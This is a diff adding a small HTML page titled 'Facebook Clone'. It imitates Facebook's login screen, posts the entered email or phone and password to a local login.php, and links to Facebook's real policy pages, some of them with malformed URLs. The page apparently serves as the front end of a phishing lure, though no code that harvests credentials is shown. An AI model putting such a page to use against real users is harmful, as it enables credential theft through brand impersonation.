@@ -1,0 +1,47 @@
+<link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Facebook Clone</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+
+<body>
+    <div>
+        <h3>facebook</h3>
+        <h3>Please Log In to continue.</h3>
+
+        <form action="./login.php" method="POST">
+            <label for="username">
+                Email or Phone
+                <br>
+                <input id="username" name="username" type="text">
+            </label>
+            <br><br>
+
+            <label for="password">
+                Password
+                <br>
+                <input id="password" name="password" type="password">
+            </label>
+
+            <p>
+                By tapping Sign Up, you agree to our <a
+                    href="http://https://free.facebook.com/legal/terms/update?ref=registration" target="1">Terms</a>,
+                <a href="https://free.facebook.com/about/privacy/update" target="2">Data Policy</a> and <a
+                    href="http://https://free.facebook.com/policies/cookies/" target="3">Cookie Policy</a>. You may
+                receive SMS
+                notifications from us and can opt out at any time.
+            </p>
+            <input name="login" type="submit" value="Log In">
+            <p id="special">Forgot account?</p>
+        </form>
+    </div>
+</body>
+
+</html>
